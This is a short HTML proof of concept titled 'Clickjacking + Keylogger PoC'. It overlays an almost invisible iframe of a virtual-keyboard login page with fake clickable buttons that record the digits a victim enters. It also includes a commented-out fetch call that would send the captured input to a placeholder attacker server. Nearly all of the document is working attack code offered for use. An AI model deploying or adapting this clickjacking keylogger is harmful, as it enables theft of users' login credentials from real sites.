# Zencodx



<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking + Keylogger PoC</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      opacity: 0.01; /* almost invisible */
      z-index: 1;
      pointer-events: auto;
    }

    .fake-btn {
      position: absolute;
      width: 60px;
      height: 60px;
      background-color: rgba(255, 0, 0, 0.2);
      border: 1px solid #f00;
      z-index: 2;
      cursor: pointer;
    }
  </style>
</head>
<body>

<!-- Transparent iframe loading the vulnerable login page -->
<iframe src="https://vulnerable-target.com/virtual-keyboard-login"></iframe>

<!-- Fake overlay buttons that match real virtual keyboard key positions -->
<!-- Position these manually to align with keys like 1, 2, 3, etc. -->
<div class="fake-btn" style="top: 400px; left: 300px;" onclick="captureKey('1')"></div>
<div class="fake-btn" style="top: 400px; left: 370px;" onclick="captureKey('2')"></div>
<div class="fake-btn" style="top: 400px; left: 440px;" onclick="captureKey('3')"></div>
<!-- Add more buttons as needed to match keyboard layout -->

<script>
  let capturedInput = '';

  function captureKey(char) {
    capturedInput += char;
    console.log('[Captured Input So Far]:', capturedInput);

    // Optional: Send to remote server
    // fetch('https://your-attacker-server.com/log?data=' + encodeURIComponent(capturedInput));
  }
</script>

</body>
</html>
